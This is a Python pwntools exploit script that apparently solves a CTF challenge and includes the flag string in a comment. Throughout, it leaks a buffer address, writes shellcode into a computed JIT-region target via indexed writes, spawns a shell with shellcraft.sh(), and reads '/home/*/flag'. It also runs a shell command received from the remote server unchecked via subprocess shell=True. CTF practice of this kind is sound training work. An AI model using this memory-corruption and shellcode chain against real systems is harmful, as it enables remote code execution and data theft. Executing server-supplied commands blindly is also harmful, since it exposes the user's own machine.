#!/usr/bin/env python3
from pwn import *
import subprocess

# AIS3{R0P_n3v3r_d1e} 

context.arch = 'amd64'
y = remote( 'eof01.zoolab.org' , 10102 )
#y = remote( 'localhost' , 10102 )
#y = process( ['./sde/sde64','-cet',  '-cet-stderr', '-no-follow-child',  '--',  './chal'] )

y.recvuntil( 'command:\n\n' )
cmd = y.recvline()
print(cmd)
ans = subprocess.check_output( cmd , shell=True )
print(ans)
y.sendafter( 'stamp:' , ans )

y.recvuntil( 'DEBUG:' )
y.recvuntil( '0x' )
y.recvuntil( '0x' )
sbuf = int(y.recvline() , 16)
success( f'sbuf -> {hex(sbuf)}' )

jit = sbuf + 0x100ce5000
target = jit + 0xd5b40
idx = (target-sbuf) // 8

print( f'b *{hex(target)}' )

sc = asm('''
    mov rsi, rdx
    xor rdi, rdi
    mov rdx, 0x100
    xor rax, rax
    syscall
''').ljust( 0x20 , b'\x90' )

print(len(sc))

p = flat(
    #0, 0,
    #0, 0,
    #0, 0,
    idx + 1, sc[:8],
    idx + 2, sc[8:16],
    idx + 3, sc[16:24],
    idx    , sc[24:32],
    #0x88888888, 0x7777777,
)
#pause()
y.sendline(p)

y.send( b'\x90' * 0x20 + asm(shellcraft.sh()) )

sleep(0.1)

y.sendline( 'id' )
y.sendline( 'cat /home/*/flag' )

y.interactive()